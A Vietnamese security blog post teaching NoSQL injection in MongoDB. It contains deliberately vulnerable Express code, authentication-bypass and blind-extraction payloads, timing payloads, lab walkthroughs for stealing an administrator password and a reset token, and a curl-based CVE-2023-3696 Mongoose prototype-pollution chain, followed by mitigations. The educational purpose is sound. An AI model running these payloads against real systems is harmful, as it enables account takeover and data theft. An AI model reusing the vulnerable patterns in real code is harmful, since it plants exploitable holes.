---
layout: post
title: "NoSQL injection"
render_with_liquid: false
categories:
  - Web Security
  - Common Injection
tags:
  - nosql-injection
---

# NoSQL injection

Các ví dụ trong bài chỉ đặt trong bối cảnh học tập, lab, kiểm thử hợp pháp, hoặc hệ thống đã được ủy quyền.

## 1. Nền tảng NoSQL

NoSQL database là cơ sở dữ liệu lưu trữ và truy xuất dữ liệu theo định dạng khác với bảng quan hệ SQL truyền thống. Chúng thường được thiết kế để xử lý lượng lớn dữ liệu unstructured data (dữ liệu không có cấu trúc cố định) hoặc semi-structured data (dữ liệu bán cấu trúc), nên thường có ít relational constraints (ràng buộc quan hệ) và consistency checks (kiểm tra tính nhất quán) hơn SQL.

Ứng dụng vẫn tương tác với NoSQL database bằng query (truy vấn) được gửi từ application layer xuống database. Điểm khác biệt quan trọng là NoSQL không có một chuẩn chung tương đương SQL. Tùy công nghệ, query có thể dùng custom query language, XML, JSON, hoặc API riêng.

Một số model NoSQL phổ biến:

- Document stores: lưu dữ liệu trong document linh hoạt, bán cấu trúc, thường ở dạng JSON, BSON, hoặc XML. Dữ liệu được query qua API hoặc query language. Ví dụ: MongoDB, Couchbase.
- Key-value stores: lưu dữ liệu theo cặp key-value. Mỗi trường dữ liệu gắn với một key duy nhất, và value được truy xuất dựa trên key đó. Ví dụ: Redis, Amazon DynamoDB.
- Wide-column stores: tổ chức dữ liệu liên quan trong các column families linh hoạt thay vì row truyền thống. Ví dụ: Apache Cassandra, Apache HBase.
- Graph databases: dùng node để lưu entity và edge để lưu quan hệ giữa các entity. Ví dụ: Neo4j, Amazon Neptune.

Hiểu model và ngôn ngữ query của database giúp xác định cách kiểm thử injection phù hợp, vì payload phụ thuộc nhiều vào cú pháp và cấu trúc dữ liệu đang được xử lý.

## 2. NoSQL injection là gì

NoSQL injection là vulnerability (lỗ hổng) xảy ra khi người kiểm thử có thể can thiệp vào query mà ứng dụng gửi đến NoSQL database. Khi input của người dùng được đưa trực tiếp vào query mà không được xử lý đúng, input đó có thể làm thay đổi cú pháp, điều kiện lọc, hoặc operator của query.

Impact có thể bao gồm:

- Bypass authentication hoặc cơ chế bảo vệ.
- Extract hoặc edit data.
- Gây denial of service.
- Execute code trên server trong một số ngữ cảnh database/operator hỗ trợ đánh giá JavaScript.

Có hai nhóm chính:

- Syntax injection: phá vỡ cú pháp query NoSQL để chèn payload mới vào query.
- Operator injection: chèn NoSQL query operators để thao túng điều kiện query.

## 3. Syntax injection

Syntax injection xảy ra khi input có thể làm hỏng cú pháp query gốc, sau đó chèn thêm biểu thức hợp lệ để thay đổi logic. Cách tiếp cận tương tự SQL injection ở mức ý tưởng, nhưng payload thay đổi nhiều vì NoSQL database dùng nhiều ngôn ngữ query, kiểu cú pháp, và cấu trúc dữ liệu khác nhau.

Backend JavaScript vulnerable tương ứng thường có dạng nối trực tiếp input vào JavaScript expression trong `$where`:

```js
app.get("/product/lookup", async (req, res) => {
  const category = req.query.category;

  const products = await db.collection("products").find({
    $where: "this.category == '" + category + "' && this.released == 1",
  }).toArray();

  res.json(products);
});
```

Với kiểu triển khai này, `category` không còn chỉ là dữ liệu. Nó trở thành một phần của expression, nên ký tự quote, boolean condition, hoặc null character có thể làm thay đổi query được database đánh giá.

### 3.1. Detect bằng lỗi cú pháp

Cách kiểm thử cơ bản là gửi fuzz strings và special characters vào từng input để xem database error hoặc hành vi khác thường có xuất hiện không. Nếu biết database hoặc API language phía sau, dùng ký tự đặc biệt phù hợp với ngôn ngữ đó. Nếu chưa biết, dùng nhiều fuzz strings để bao phủ nhiều kiểu API language.

Ví dụ với MongoDB, một ứng dụng lọc sản phẩm theo category có request:

```http
GET /product/lookup?category=fizzy
```

Ứng dụng có thể tạo query tương tự:

```js
this.category == 'fizzy'
```

Một fuzz string dùng để thử phá cú pháp MongoDB:

```text
'"`{ ;
$Foo}
$Foo \xYZ
```

Khi payload đi qua URL, cần URL-encode:

```text
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Khi payload đi trong JSON property, cùng ý tưởng có thể được biểu diễn ở dạng:

```text
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Nếu response thay đổi so với request hợp lệ ban đầu, đó có thể là dấu hiệu input chưa được filter hoặc sanitize đúng. Payload cần điều chỉnh theo context; nếu sai context, ứng dụng có thể chặn ở validation layer trước khi query được thực thi.

### 3.2. Xác định ký tự được xử lý

Sau khi thấy dấu hiệu bất thường, thử từng ký tự riêng lẻ để xác định ký tự nào được database hoặc query engine diễn giải như cú pháp.

Ví dụ gửi ký tự `'` có thể biến query thành:

```js
this.category == '''
```

Nếu response thay đổi, ký tự `'` có thể đã phá cú pháp query và gây syntax error. Có thể xác nhận bằng cách gửi một chuỗi hợp lệ hơn, chẳng hạn escape quote:

```js
this.category == '\''
```

Nếu phiên bản escape không gây syntax error, ứng dụng có thể đang xử lý input theo cách cho phép injection.

### 3.3. Xác nhận boolean condition

Khi đã xác định có thể tác động đến cú pháp, bước tiếp theo là kiểm tra xem payload có thay đổi boolean condition (điều kiện đúng/sai) trong query hay không.

Ví dụ với tham số `category`, gửi hai request:

```text
fizzy' && 0 && 'x
```

```text
fizzy' && 1 && 'x
```

Nếu false condition làm response khác đi nhưng true condition vẫn trả về gần giống request hợp lệ, điều đó cho thấy phần syntax được chèn đã ảnh hưởng đến server-side query.

### 3.4. Ghi đè điều kiện có sẵn

Khi boolean condition có thể bị điều khiển, payload có thể ghi đè logic lọc hiện tại bằng một điều kiện luôn đúng:

```text
fizzy'||'1'=='1
```

Query có thể trở thành:

```js
this.category == 'fizzy'||'1'=='1'
```

Vì điều kiện chèn vào luôn đúng, query có thể trả về tất cả item, bao gồm cả category ẩn hoặc chưa biết.

Cần cẩn thận khi dùng điều kiện luôn đúng trong lab hoặc kiểm thử được ủy quyền. Một request có thể được ứng dụng dùng lại trong nhiều query khác nhau; nếu input này đi vào thao tác update hoặc delete, điều kiện luôn đúng có thể gây thay đổi hoặc mất dữ liệu ngoài ý muốn.

### 3.5. Bỏ qua điều kiện phía sau bằng null character

MongoDB có thể bỏ qua phần sau null character. Nếu query gốc có thêm điều kiện `released`:

```js
this.category == 'fizzy' && this.released == 1
```

Payload:

```text
fizzy'%00
```

có thể tạo query:

```js
this.category == 'fizzy'\u0000' && this.released == 1
```

Nếu phần sau null character bị bỏ qua, điều kiện `this.released == 1` không còn được áp dụng. Kết quả là sản phẩm trong category đó có thể được hiển thị cả khi chưa released.

## 4. Operator injection

NoSQL query operators là các operator dùng để chỉ định điều kiện mà document phải thỏa mãn để được đưa vào kết quả query. Trong MongoDB, một số operator thường gặp gồm:

- `$where`: match document thỏa mãn một JavaScript expression.
- `$ne`: match mọi giá trị không bằng giá trị được chỉ định.
- `$in`: match mọi giá trị nằm trong array được chỉ định.
- `$regex`: chọn document có value khớp với regular expression.

Operator injection xảy ra khi input cho phép chèn các operator này vào query. Cách kiểm thử là gửi có hệ thống nhiều operator vào nhiều input khác nhau, sau đó quan sát error message hoặc khác biệt response.

Backend JavaScript vulnerable tương ứng thường đưa trực tiếp value từ request body vào MongoDB query mà không ép kiểu về string:

```js
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne({
    username: req.body.username,
    password: req.body.password,
  });

  if (!user) {
    return res.status(401).send("Invalid username or password");
  }

  req.session.user = user.username;
  res.redirect("/my-account");
});
```

Nếu request body cho phép JSON object, `username` hoặc `password` có thể không phải string mà là object như `{"$ne":"invalid"}` hoặc `{"$regex":"^.*"}`. Khi object này được đưa nguyên vào query, database xử lý nó như operator condition.

### 4.1. Đưa operator vào request

Trong JSON request, operator có thể được chèn dưới dạng nested object:

```json
{"username":"wiener"}
```

có thể được thử thành:

```json
{"username":{"$ne":"invalid"}}
```

Với input dạng URL parameter, operator có thể được biểu diễn trong parameter name:

```text
username[$ne]=invalid
```

Nếu cách này không hoạt động, có thể thử:

1. Chuyển request method từ `GET` sang `POST`.
2. Đổi `Content-Type` thành `application/json`.
3. Đưa JSON vào request body.
4. Chèn operator trong JSON.

Một công cụ chuyển đổi Content-Type có thể hỗ trợ tự động đổi URL-encoded `POST` request sang JSON khi kiểm thử trong lab.

### 4.2. Detect trong login flow

Ví dụ một login endpoint nhận JSON body:

```json
{"username":"wiener","password":"peter"}
```

Để kiểm tra input `username` có xử lý operator hay không:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Nếu `$ne` được áp dụng, query sẽ tìm user có `username` không bằng `invalid`.

Nếu cả `username` và `password` đều xử lý operator, authentication có thể bị bypass:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Query này trả về các credential có `username` và `password` đều không bằng `invalid`. Kết quả có thể là đăng nhập vào account đầu tiên trong collection.

Để nhắm vào account cụ thể khi đã biết hoặc đoán được username:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## 5. Extract data bằng syntax injection

Một số NoSQL database operator hoặc function có thể chạy JavaScript giới hạn, chẳng hạn MongoDB `$where` operator và `mapReduce()` function. Nếu ứng dụng vulnerable sử dụng các operator/function này, database có thể đánh giá JavaScript như một phần của query.

Backend JavaScript vulnerable tương ứng là user lookup dùng `$where` và nối username vào expression:

```js
app.get("/user/lookup", async (req, res) => {
  const username = req.query.username;

  const user = await db.collection("users").findOne({
    $where: "this.username == '" + username + "'",
  });

  if (!user) {
    return res.status(404).send("Could not find user");
  }

  res.json({
    username: user.username,
    role: user.role,
  });
});
```

Ở đây response khác nhau giữa user tồn tại và không tồn tại tạo điều kiện cho boolean-based extraction. Khi payload chèn thêm điều kiện trên `this.password`, backend vẫn chỉ trả thông tin hạn chế, nhưng khác biệt response đủ để suy luận từng ký tự.

Ví dụ user lookup nhận:

```http
GET /user/lookup?username=admin
```

Query phía sau có thể là:

```json
{"$where":"this.username == 'admin'"}
```

Vì query dùng `$where`, có thể thử chèn JavaScript function hoặc expression để suy luận dữ liệu nhạy cảm qua response.

Ví dụ kiểm tra ký tự đầu tiên của password:

```text
admin' && this.password[0] == 'a' || 'a'=='b
```

Nếu response cho biết điều kiện đúng, có thể lặp lại theo từng vị trí để extract password từng ký tự.

Có thể dùng `match()` để kiểm tra pattern:

```text
admin' && this.password.match(/\d/) || 'a'=='b
```

Payload này giúp xác định password có chứa digit (chữ số) hay không.

### 5.1. Xác định field name

MongoDB xử lý semi-structured data và không yêu cầu fixed schema (schema cố định), nên trước khi extract data có thể cần xác định field hợp lệ trong collection.

Để kiểm tra field `password` có tồn tại không:

```text
admin' && this.password!='
```

Gửi lại payload tương tự với field đã biết tồn tại và field không tồn tại:

```text
admin' && this.username!='
```

```text
admin' && this.foo!='
```

Nếu response của `password` giống field tồn tại như `username`, nhưng khác field không tồn tại như `foo`, có thể suy ra field `password` tồn tại. Khi cần thử nhiều field name, có thể dùng dictionary attack với wordlist field name.

## 6. Extract data bằng operator injection

Ngay cả khi query gốc không dùng operator cho phép chạy JavaScript, ứng dụng vẫn có thể cho phép chèn operator mới. Sau đó có thể dùng boolean condition để xác định JavaScript trong operator có được thực thi hay không.

Backend JavaScript vulnerable tương ứng là đưa toàn bộ JSON body vào query:

```js
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne(req.body);

  if (!user) {
    return res.status(401).send("Invalid username or password");
  }

  if (user.locked) {
    return res.status(403).send("Account locked");
  }

  req.session.user = user.username;
  res.redirect("/my-account");
});
```

Vì backend dùng nguyên `req.body`, request có thể thêm top-level operator như `$where`. Khác biệt response giữa `Invalid username or password` và `Account locked` tạo tín hiệu để kiểm tra JavaScript expression, extract field name bằng `Object.keys(this)`, hoặc extract token value từng ký tự.

### 6.1. Chèn `$where`

Với login request:

```json
{"username":"wiener","password":"peter"}
```

Thêm `$where` như một parameter bổ sung và so sánh false/true condition:

```json
{"username":"wiener","password":"peter","$where":"0"}
```

```json
{"username":"wiener","password":"peter","$where":"1"}
```

Nếu response khác nhau, JavaScript expression trong `$where` có thể đang được evaluate.

### 6.2. Extract field name bằng `Object.keys()`

Khi đã chèn được operator cho phép chạy JavaScript, có thể dùng `Object.keys()` để extract tên field.

Ví dụ:

```json
{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}
```

Payload này kiểm tra field đầu tiên của object hiện tại và so khớp ký tự đầu tiên của field name. Bằng cách thay đổi index field, vị trí ký tự, và ký tự thử, có thể extract field name từng ký tự.

### 6.3. Extract data bằng `$regex`

Trong một số trường hợp, vẫn có thể extract data bằng operator không chạy JavaScript. Ví dụ login request:

```json
{"username":"myuser","password":"mypass"}
```

Thử xem `$regex` có được xử lý trên `password` không:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Nếu response khác với response khi gửi password sai, ứng dụng có thể vulnerable. Sau đó có thể dùng `$regex` để kiểm tra dữ liệu từng ký tự, ví dụ:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

## 7. Timing-based injection

Đôi khi database error không tạo khác biệt rõ ràng trong response body. Khi đó có thể phát hiện và khai thác bằng JavaScript injection gây conditional time delay (độ trễ có điều kiện).

Backend JavaScript vulnerable tương ứng vẫn là `$where` nhận expression có chứa input:

```js
app.get("/user/lookup", async (req, res) => {
  const username = req.query.username;

  const user = await db.collection("users").findOne({
    $where: "this.username == '" + username + "'",
  });

  res.status(user ? 200 : 404).end();
});
```

Nếu response body không khác biệt đủ rõ, payload có thể tạo delay khi điều kiện đúng. Khi thời gian phản hồi thay đổi so với baseline, người kiểm thử có tín hiệu để xác định expression đã được evaluate.

Quy trình:

1. Load page nhiều lần để xác định baseline loading time.
2. Chèn timing-based payload vào input. Payload gây delay có chủ đích khi được thực thi, ví dụ:

```json
{"$where":"sleep(5000)"}
```

3. Quan sát response có chậm hơn baseline hay không. Nếu có, đó là dấu hiệu injection thành công.

Ví dụ payload gây delay nếu ký tự đầu của password là `a`:

```text
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```text
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

## 8. Luồng lab: hiển thị sản phẩm chưa released

Một lab điển hình dùng category filter được backed bởi MongoDB và vulnerable với NoSQL injection. Mục tiêu là làm ứng dụng hiển thị sản phẩm chưa released.

Luồng kiểm thử:

1. Chọn một product category và gửi request lọc category sang Repeater.
2. Gửi ký tự `'` trong `category`. Nếu xuất hiện JavaScript syntax error, input có thể chưa được filter hoặc sanitize đúng.
3. Gửi JavaScript payload hợp lệ:

```text
Gifts'+'
```

Nếu không còn syntax error, có thể đang có server-side injection.

4. So sánh false/true condition:

```text
Gifts' && 0 && 'x
```

```text
Gifts' && 1 && 'x
```

Nếu false condition không trả sản phẩm còn true condition vẫn trả sản phẩm trong `Gifts`, payload đã tác động đến query logic.

5. Gửi điều kiện luôn đúng:

```text
Gifts'||1||'
```

Response trong browser sẽ chứa sản phẩm chưa released nếu injection thành công.

## 9. Luồng lab: extract password qua user lookup

Một lab khác dùng chức năng user lookup backed bởi MongoDB. Mục tiêu là extract password của `administrator`, rồi login vào account đó. Account hợp lệ ban đầu là `wiener:peter`, và password mục tiêu chỉ dùng lowercase letters.

Luồng kiểm thử:

1. Login bằng `wiener:peter`.
2. Gửi request `GET /user/lookup?user=wiener` sang Repeater.
3. Gửi `'` trong `user`. Nếu response báo lỗi, input có thể chưa được sanitize đúng.
4. Gửi payload hợp lệ:

```text
wiener'+'
```

Nếu account detail của `wiener` vẫn được trả về, có dấu hiệu server-side injection.

5. So sánh false/true condition:

```text
wiener' && '1'=='2
```

```text
wiener' && '1'=='1
```

False condition trả `Could not find user`, còn true condition trả account detail, nghĩa là có thể dùng response để suy luận boolean.

6. Xác định password length:

```text
administrator' && this.password.length < 30 || 'a'=='b
```

Giảm dần giá trị length. Trong lab này, điều kiện với `9` trả detail của `administrator`, còn `8` trả lỗi, cho thấy password dài 8 ký tự.

7. Enumerate từng ký tự password bằng Intruder với Cluster bomb:

```text
administrator' && this.password[§0§]=='§a§
```

Position thứ nhất chạy từ `0` đến `7`; position thứ hai chạy từ `a` đến `z`. Những request có response đúng sẽ cho biết ký tự tại từng vị trí. Ghép các ký tự thu được để login vào `administrator`.

## 10. Luồng lab: extract unknown field và reset token

Một lab dùng login flow backed bởi MongoDB. Mục tiêu là login với user `carlos`. Để làm được điều này, cần extract password reset token của `carlos`.

Luồng kiểm thử:

1. Thử login với `carlos:invalid` và ghi nhận response `Invalid username or password`.
2. Gửi `POST /login` sang Repeater.
3. Đổi `password` từ `"invalid"` thành:

```json
{"$ne":"invalid"}
```

Nếu response chuyển thành `Account locked`, operator `$ne` đã được chấp nhận. Dù chưa truy cập được account, response này cho thấy ứng dụng vulnerable.

4. Thử reset password cho `carlos`. Cơ chế reset yêu cầu email verification, nên không thể tự reset trực tiếp.
5. Kiểm tra JavaScript injection bằng `$where`:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
```

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

Nếu `"0"` trả `Invalid username or password` còn `"1"` trả `Account locked`, JavaScript trong `$where` đang được evaluate.

6. Dùng Intruder để xác định field trên user object:

```json
{"$where":"Object.keys(this)[1].match('^.{}.*')"}
```

Thêm hai payload positions để brute-force vị trí ký tự và ký tự:

```json
{"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
```

Position thứ nhất là số thứ tự ký tự, ví dụ `0` đến `20`. Position thứ hai gồm digits, lowercase letters, và uppercase letters. Sort kết quả theo vị trí và response length để phân biệt response `Account locked` với `Invalid username or password`. Các ký tự đúng ghép lại thành field name.

7. Lặp lại bằng cách tăng index trong `Object.keys(this)[n]` để tìm field khác:

```json
{"$where":"Object.keys(this)[2].match('^.{}.*')"}
```

Một trong các field tìm được là field chứa password reset token.

8. Kiểm tra field reset token trên endpoint reset password. Với field sai:

```http
GET /forgot-password?foo=invalid
```

Response giống request gốc. Với field token đã extract:

```http
GET /forgot-password?YOURTOKENNAME=invalid
```

Response `Invalid token` xác nhận đúng field name và endpoint.

9. Extract giá trị token bằng `$where`:

```json
{"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"}
```

Thay `YOURTOKENNAME` bằng field token đã tìm được. Dùng cùng kỹ thuật vị trí ký tự và ký tự thử để ghép token value.

10. Gửi token value vào endpoint reset:

```http
GET /forgot-password?YOURTOKENNAME=TOKENVALUE
```

Sau đó đổi password và login vào `carlos`.

## 11. Case study: Mongoose Prototype Pollution bypass localhost check

Case này ghép hai cơ chế:

- Prototype pollution (ô nhiễm prototype: ghi thuộc tính vào `Object.prototype`, khiến nhiều object khác kế thừa thuộc tính đó) trong Mongoose qua `findByIdAndUpdate()`.
- Node.js socket gadget (điểm đọc thuộc tính có thể bị ảnh hưởng bởi prototype pollution) dựa trên `_peername`, làm `req.connection.remoteAddress` trả về địa chỉ giả.

Chuỗi khai thác trong môi trường lab:

1. Tạo note với `title = "127.0.0.1"`.
2. Dùng `/update` với `$rename` để đổi `title` thành `__proto__._peername.address`.
3. Để chính route `/update` gọi `Note.find(...)` và kích hoạt prototype pollution.
4. Gọi `/flag`.
5. `req.connection.remoteAddress` resolve thành `127.0.0.1`, nên localhost check bị bypass.

CVE-2023-3696 ghi nhận Mongoose bị ảnh hưởng trong các dải version `>= 7.0.0, < 7.3.3`, `>= 6.0.0, < 6.11.3`, và `< 5.13.20`. Version `7.2.4` trong case này nằm trong vùng affected.

### 11.1. Code mục tiêu

Ứng dụng Express/Mongoose rút gọn:

```js
const express = require("express");
const mongoose = require("mongoose");

const port = process.env.PORT ?? 3000;
const app = express();

const Note = mongoose.model("Note", new mongoose.Schema({
  title: String,
  content: String,
}));

app.use(express.static("public"));
app.use(express.json());

app.get("/flag", (req, res) => {
  const remoteAddress = req.connection.remoteAddress;

  if (
    remoteAddress === "127.0.0.1" ||
    remoteAddress === "::1" ||
    remoteAddress === "::ffff:127.0.0.1"
  ) {
    res.send(process.env.FLAG ?? "FLAG{fake_flag_for_testing}");
  } else {
    res.status(403).json({ Message: "Access denied" });
  }
});

app.post("/create", async (req, res) => {
  try {
    const { title, content } = req.body;

    if (typeof title !== "string" || typeof content !== "string") {
      res.status(400).json({ Message: "Invalid title or content" });
      return;
    }

    const note = new Note({ title, content });
    await note.save();
    res.json(note);
  } catch (error) {
    console.error(error);
    res.status(500).json({ Message: "An error occurred" });
  }
});

app.get("/get/:noteId", async (req, res) => {
  try {
    const noteId = req.params.noteId;
    const note = await Note.findOne({ _id: noteId });
    res.json(note);
  } catch (error) {
    console.error(error);
    res.status(500).json({ Message: "An error occurred" });
  }
});

app.post("/update", async (req, res) => {
  try {
    const { noteId } = req.body;

    await Note.findByIdAndUpdate(noteId, req.body);
    const result = await Note.find({ _id: noteId });

    res.json(result);
  } catch (error) {
    console.error(error);
    res.status(500).json({ Message: "An error occurred" });
  }
});

const main = async () => {
  try {
    await mongoose.connect("mongodb://localhost:27017/app");
    app.listen(port, () => {
      console.debug(`Server started on port ${port}`);
    });
  } catch (error) {
    console.error(error);
    process.exit(1);
  }
};

main();
```

Dependency đáng chú ý:

```json
{
  "dependencies": {
    "express": "^4.18.2",
    "mongoose": "^7.2.4"
  }
}
```

### 11.2. Bề mặt tấn công

Route `/create` chỉ cho tạo note với hai field string:

- `title`
- `content`

Route này không trực tiếp pollute prototype, nhưng nó cho phép chuẩn bị giá trị hợp lệ ban đầu để dùng ở bước sau.

Sink chính nằm ở `/update`:

```js
await Note.findByIdAndUpdate(noteId, req.body);
const result = await Note.find({ _id: noteId });
```

Vấn đề gồm hai phần:

- `req.body` được truyền thẳng vào `findByIdAndUpdate()`.
- Route gọi tiếp `find()` trên document vừa bị update.

Điều này tạo đủ chain:

- Write primitive (khả năng ghi dữ liệu vào vị trí có ích cho khai thác) qua `findByIdAndUpdate()`.
- Trigger primitive (hành động kích hoạt side effect của dữ liệu đã ghi) qua `Note.find(...)`.

### 11.3. Root cause phía Mongoose

Trong vùng version affected, Mongoose có prototype pollution trong quá trình xử lý document update. Một PoC rút gọn cho cơ chế này:

```js
await Example.findByIdAndUpdate(example._id, {
  $rename: {
    hello: "__proto__.polluted",
  },
});

await Example.find();
```

Sau `find()`, object rỗng có thể kế thừa thuộc tính mới:

```js
const test = {};
console.log(test.polluted);
```

Ý nghĩa với case này:

- Không cần merge object phức tạp.
- Không cần `constructor.prototype.*`.
- Chỉ cần có một field hợp lệ chứa giá trị mong muốn.
- Dùng `$rename` đổi field đó sang path `__proto__.<gadget>`.
- Để route tự gọi `find()` và kích hoạt pollution.

### 11.4. Vì sao gadget là `_peername.address`

Đích kiểm tra của route `/flag` là:

```js
const remoteAddress = req.connection.remoteAddress;
```

Trong Node.js HTTP, `req.connection` là cách gọi deprecated và về bản chất trỏ đến socket của request. Vì vậy biểu thức trên tương đương đọc:

```js
req.socket.remoteAddress;
```

`socket.remoteAddress` lấy địa chỉ peer từ peername object. Cơ chế nội bộ ưu tiên dùng `this._peername` nếu thuộc tính này đã có; nếu chưa có thì mới đi tiếp đến handle của socket.

Do đó gadget đúng không phải:

```js
Object.prototype.remoteAddress = "127.0.0.1";
```

mà là:

```js
Object.prototype._peername = { address: "127.0.0.1" };
```

Khi `socket.remoteAddress` đọc `_peername` qua prototype chain, giá trị `address` có thể trở thành `127.0.0.1`.

### 11.5. Vì sao phải dùng `$rename`

Schema chỉ có:

```js
{
  title: String,
  content: String,
}
```

Route `/create` cũng ép `title` và `content` phải là string. Vì vậy cần một cách để:

- Tạo một string hợp lệ trong document.
- Chuyển giá trị đó vào path độc hại `__proto__._peername.address`.

`$rename` là primitive phù hợp vì nó đổi tên field hiện có sang path mới. Trong case này, `title` đang chứa `"127.0.0.1"`, rồi được đổi thành `__proto__._peername.address`.

### 11.6. Attack chain hoàn chỉnh

Bước 1: tạo note mồi với `title` là địa chỉ localhost mà `/flag` chấp nhận:

```bash
curl -s http://TARGET:3000/create \
  -H "Content-Type: application/json" \
  -d '{"title":"127.0.0.1","content":"demo"}'
```

Mục tiêu là lưu chuỗi `"127.0.0.1"` vào một field hợp lệ trong MongoDB.

![Tạo note mồi với title là 127.0.0.1](/assets/img/nosql-injection/mongoose-prototype-pollution-create.png)

Bước 2: dùng `/update` để pollute prototype:

```bash
curl -s http://TARGET:3000/update \
  -H "Content-Type: application/json" \
  -d '{
    "noteId":"<NOTE_ID>",
    "$rename":{
      "title":"__proto__._peername.address"
    }
  }'
```

`findByIdAndUpdate()` đổi field từ `title` thành `__proto__._peername.address`. Ngay sau đó route gọi:

```js
const result = await Note.find({ _id: noteId });
```

Thao tác `find()` khởi tạo lại document và kích hoạt prototype pollution. Trạng thái logic sau bước này tương đương:

![Dùng $rename để đổi title thành __proto__._peername.address](/assets/img/nosql-injection/mongoose-prototype-pollution-update.png)

```js
Object.prototype._peername = { address: "127.0.0.1" };
```

Bước 3: gọi `/flag`:

```bash
curl -s http://TARGET:3000/flag
```

Route `/flag` đọc:

```js
const remoteAddress = req.connection.remoteAddress;
```

Do `req.connection` là socket và `remoteAddress` dựa vào peername object, giá trị đọc được có thể là `127.0.0.1`. Khi đó điều kiện localhost đúng:

```js
if (
  remoteAddress === "127.0.0.1" ||
  remoteAddress === "::1" ||
  remoteAddress === "::ffff:127.0.0.1"
) {
  res.send(process.env.FLAG);
}
```

Impact của case này là bypass authorization dựa trên localhost check và truy cập dữ liệu chỉ dành cho request nội bộ.

![Gọi /flag sau khi req.connection.remoteAddress bị resolve thành localhost](/assets/img/nosql-injection/mongoose-prototype-pollution-flag.png)

## 12. Mitigation

Cách phòng chống phụ thuộc vào NoSQL technology cụ thể, nên cần dựa trên security documentation của database đang dùng. Các guideline chung:

- Sanitize và validate user input bằng allowlist các ký tự được chấp nhận.
- Đưa user input vào query bằng parameterized queries thay vì nối trực tiếp input vào query string.
- Để ngăn operator injection, áp dụng allowlist cho các key được chấp nhận.
- Với CVE-2023-3696 trong Mongoose, dùng bản đã vá theo nhánh đang triển khai, chẳng hạn `7.3.3`, `6.11.3`, `5.13.20` hoặc mới hơn.

## 13. Glossary

- Query: truy vấn ứng dụng gửi đến database để đọc, lọc, hoặc thao tác dữ liệu.
- Document: đơn vị dữ liệu bán cấu trúc trong document store, thường biểu diễn bằng JSON/BSON/XML.
- Syntax injection: injection phá vỡ cú pháp query để chèn biểu thức mới.
- Operator injection: injection chèn query operator như `$ne`, `$where`, `$in`, `$regex` để thay đổi logic query.
- `$where`: MongoDB operator cho phép match document dựa trên JavaScript expression.
- `$ne`: operator so khớp giá trị không bằng giá trị chỉ định.
- `$in`: operator so khớp giá trị nằm trong một array chỉ định.
- `$regex`: operator so khớp bằng regular expression.
- Null character: ký tự null có thể làm một số xử lý bỏ qua phần dữ liệu đứng sau nó.
- Boolean condition: điều kiện trả về true hoặc false, thường được dùng để suy luận dữ liệu qua khác biệt response.
- Prototype pollution: lỗi cho phép ghi thuộc tính vào prototype chung, khiến object khác kế thừa thuộc tính do attacker kiểm soát.
- Gadget: đoạn logic hoặc điểm đọc thuộc tính có thể biến prototype pollution thành impact thực tế.
- Write primitive: khả năng ghi dữ liệu vào vị trí cần thiết cho chuỗi khai thác.
- Trigger primitive: hành động làm dữ liệu đã ghi được xử lý và tạo side effect bảo mật.
